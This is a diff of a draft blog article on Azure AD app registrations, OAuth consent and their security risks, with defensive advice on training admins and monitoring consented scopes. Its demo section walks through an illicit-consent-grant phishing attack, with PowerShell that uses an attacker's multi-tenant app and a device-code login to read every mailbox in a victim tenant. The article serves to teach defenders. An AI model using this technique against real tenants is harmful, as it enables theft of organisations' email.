@@ -15,7 +15,6 @@ The goal of this article will be to explain:
 - What single tenant vs multi tenant means
 - What consent is and why we have to consider it seriously
 - Security and monitoring auround Oauth permissions
-- Public Vs confidential application
 
 # App registration Vs Entperise application
 
@@ -75,22 +74,38 @@ For single tenant app, you should hit (or hardcode if you prefer) the endpoint h
 
 # Consent
 
+For me, consent is one of the most underestimated part of modern auth. I’ve seen global admins/App admins who click the grant admin consent button just without really understand what they’re doing. And on the other side, I’ve seen clients who click on the consent button without even taking 2 seconds to read what they consented to … But interesting things can happen if you don’t take consent seriously (see below).
+Here how I explain consent flow to a non-technical person. When you install a GPS related application on your smartphone, the phone asks you if you’re OK with the idea this app use your GPS chipset to work correctly. If you say yes, the app won’t bother you again. Here it’s the same thing with scopes instead of GPS. When AAD ask you (the user) to consent, AAD will take note you’re consented and won’t bother you again. You can see who’s consented when you check the Service Principal.
+
+You have two types of consent:
+
+- User consent (like with your smartphone) where each user has to do a manual action to consent scopes.
+- Admin consent which is where an admin give consent on behalf of all the organization users. In other words, users won’t receive any prompts, it’s already consented 😉.
+
+But who can give admin consent?
+
+- Global admin which we can be translated to god access. A GA can do anything, like give admin consent on any scopes for all users or take control back on any tenant ‘subscription. This is the domain admins group attackers try to get in the “old” AD days.
+- Application administration which can do almost everything on app registration and enterprise app except to admin consent Microsoft graph audience.  But an app admin can consent an api exposed by another app which already received admin consent by a GA. This is this RBAC is considered as a high privilege role.
+
+{% include note.html content="In certain cases, you want to be alerted when a RBAC event is generated on your subscription (Even if it’s a GA who decided to look at your sub). You can use this [logic app]((https://github.com/SCOMnewbie/Azure/tree/master/LogicApp/RBAC-Warnings) ) to be alerted." %}
+
+# Security and monitoring auround Oauth permissions
+
+Now we start to understand the big picture, the goal of this part will be to explain why we have to understand those concepts to avoid drama … As you can imagine, attackers are ready to show you what you can do with the secret you’ve added in your public application.
+
+## Danger and remediation
+
+- Global admins has to be TRAINED! They have to understand all those concepts and be ready to challenge devellopers. Imagine a GA consent a scope like Group.ReadWrite.All (delete all groups with application permission), things can become bad quickly...
+
+- Train your devellopers too. Even if AAD does a good job to require admin consent when needed, for an end user perspective, it's not really a good experience when you receive a wall of scopes to consent at the first login. Developpers should implement dynamic scopes in their application.
+
+- All Enterprise applications have to be monitored to detect overprivileged consented scopes. We will see below few ways to do it. But doing this, you will avoid end user to consent crazy scopes because the dev/admin did a bad job.
+
+- Train your users to read what they consent is not a possible option. But AAD propose few options to avoid making the consent experience too painfull. You can:
+  
+  - Under AAD/Entperprise App/User settings, you can deny the fact that users can consent themselve but you can also enable the feature to request admin consent.
 
 
-
-Multi tenant:
-- User use the app
-  - App consent 
-    - crete an SP in Tenant 2 which will reference App registration App from Tenant1.
-      - All the managememrnt is done from tenant2, no relationship between tenant 1 and tenant2 except this App regitration which is the minfestation agian.
-
-Note: Talk about the /common endpoint in your app
-
-  Recap an app registration id you Application that you code in your tenant. Imagine a Graph API based application that all tenant share. Of course, it won't be a custom backend API that only you can access.
-
-Note: Global admin take over > monitor RBAC on your sub, you can use this [logic App](https://github.com/SCOMnewbie/Azure/tree/master/LogicApp/RBAC-Warnings) that I've built.
-
-## Side effect of multi tenant app
 
 Danger
     - Principal of least privilege. Admin has to be trained, admin consent can be super critical.
@@ -107,6 +122,117 @@ Remediation
   Admin workflow help go quicker
   User assignmet (who can explicitely access you app)
 
+# Demo
+
+Enough Theory, let's "hack" a tenant!
+
+In this demo, we will have 2 tenants. One which belongs to the attacker (full access) and the other one which belongs to your company (will be GA in this demo, but I'm pretty sure worked well is your consent policy was broken). Thanks to Microsoft this "breach" has been mitigated few months ago, but this pattern can sadly be reuse in other IDPs.. I will use the portal to show you what I4ve done, in the next article, we will have some fun to create applications with code.
+
+Let's have some fun! We will build this:
+
+![hack oauth 01](/assets/img/2021-02-03/hack_oauth.png)
+
+First let's go on the attacker tenant (we have full access), and create a new multi tenant app registration called I will pown you. Then give it application mail.read (This scope give full access to read all maibox). Finally, let's generate a secret for this app. You should have something like this:
+
+![hack oauth 02](/assets/img/2021-02-03/hack_oauth_02.png)
+
+So at this point, the attacker just configure within his own tenant an application which can read email. This is a dummy exmample, but it can be "far more critical" like manage directory, write groups,...). For this demo, I will use a pretty cool module called MSAL.PS. It's not an official Powershell SDK, but it help you to generate token using MSAL. So let's now quickly test if our app is working:
+
+```powershell
+
+#Define parameters
+$tenantId = <Attacker tenantId>
+$AppId = <attacker app registration Id>
+$Secret = Read-Host -AsSecureString #secret generated previously
+$uri = "An attacker email address"
+
+#Create variables
+$uri = "https://graph.microsoft.com/v1.0/users/$UPN/messages"
+#Generate Access token for an confidential app
+$token = Get-MsalToken -ClientId $appId -ClientSecret $secret -TenantId $tenant -Scopes "https://graph.microsoft.com/.default" -ForceRefresh
+#Create header
+$Headers = @{
+    'Authorization' = $("Bearer " + $token.AccessToken)
+    "Content-Type"  = 'application/json'
+}
+#Request read email
+Invoke-RestMethod -Uri $uri -Headers $Headers
+
+```
+
+Now you should be able to read any mailbox from the attacker tenant, which is normal because you run your workflow using a application permission (run as an app, not as a user).
+
+Now this is the interresting part. Imagine now, the attacker starts a phishing attack on your company and a basic user click on a web link and arrive at the AAD authentication page. For this demo, instead of creating a webpage for the phishing attack, we will simply generate a device code authentication (puclic application with no secret shared) using the attacker AppId. So now we're on the basic user side, let's run:
+
+```powershell
+
+#Define parameters
+$tenantId = <Customer tenantId>
+$AppId = <attacker app registration Id>
+$uri = "A customer email address"
+
+#Generate Access token for an public app
+$token = Get-MsalToken -ClientId $appId -TenantId $tenant -devicecode
+#Create header
+$Headers = @{
+    'Authorization' = $("Bearer " + $token.AccessToken)
+    "Content-Type"  = 'application/json'
+}
+#Request read email
+Invoke-RestMethod -Uri $uri -Headers $Headers
+
+```
+
+Once you've entered the basic user credential, you should see something like this:
+
+![hack oauth 03](/assets/img/2021-02-03/hack_oauth_03.png)
+
+And this is where we can send a BIG THANK YOU to Microsoft. Even is a basic end user can consent every applications, MS required the application to be published. We will discussed about this below, but this technique should block most of these attacks. Now instead of a basic user, let's use a GA account from the customer side to continue the simulation. I'm pretty sure some IDPs didn't fix this attack yet. So Let's imagine we're still our basic user, but for the purpose of this demo, let's use a GA instead. So let's do exactly the same thing but user other creds instead, you should now see:
+
+![hack oauth 04](/assets/img/2021-02-03/hack_oauth_04.png)
+
+Here it's pretty obvious, but let's now imagine a good phishing attack with a good logo, and a real company name... If user does not read the scope and consent, this is where the fun begins! So let's click accept :D.
+
+![hack oauth 05](/assets/img/2021-02-03/hack_oauth_05.png)
+
+The user has now signed in. We don't really care what happen now on the app side. Let's go back on the attacker side and see what we can do now!
+
+```powershell
+
+#Define parameters
+$tenantId = <Customer tenantId>
+$AppId = <attacker app registration Id>
+$Secret = Read-Host -AsSecureString #secret generated previously
+$uri = "A customer email address"
+
+#Create variables
+$uri = "https://graph.microsoft.com/v1.0/users/$UPN/messages"
+#Generate Access token for an confidential app
+$token = Get-MsalToken -ClientId $appId -ClientSecret $secret -TenantId $tenant -Scopes "https://graph.microsoft.com/.default" -ForceRefresh
+#Create header
+$Headers = @{
+    'Authorization' = $("Bearer " + $token.AccessToken)
+    "Content-Type"  = 'application/json'
+}
+#Request read email
+Invoke-RestMethod -Uri $uri -Headers $Headers
+
+```
+
+And now, the attacker have access to your tenant and can in this case read the email address for the entiere company. And just to fully understand, now we access the company information with a service principal, so we don't care if a user has MFA, reset password or anything like that. We execute our flow through another context ... If we now check the logs, we should see:
+
+<Check service principal sign-ins>
+
+As you can see, this attack is super simple and in fact rely on the fact that admins have a light governance regarding consent and basic user do not read what they consent to. But for the rest, there is not even a secret exchange!
+
+So Microsoft succeed to mitigate this type of attacks with publishers.
+
+
+
+
+
+
+
 Monitoring Service Principal
 
 Cloud App security
@@ -120,8 +246,17 @@ Sentinel
 # references
 
 [Consent](https://docs.microsoft.com/en-us/azure/active-directory/develop/application-consent-experience)
+
 [Malicious OAuth application](https://4sysops.com/archives/the-risk-of-fake-oauth-apps-in-microsoft-365-and-azure/)
+
 [CASB](https://docs.microsoft.com/fr-fr/cloud-app-security/app-permission-policy)
 [Fake oauth apps](https://4sysops.com/archives/the-risk-of-fake-oauth-apps-in-microsoft-365-and-azure/)
+
 [single Vs multi tenant](https://docs.microsoft.com/en-us/azure/active-directory/develop/single-and-multi-tenant-apps)
+
 [OIDC in AAD](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-protocols-oidc)
+
+[Permission and consent](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-permissions-and-consent)
+
+
+[How to hack OAuth](https://youtu.be/tbu4CfzP25o)
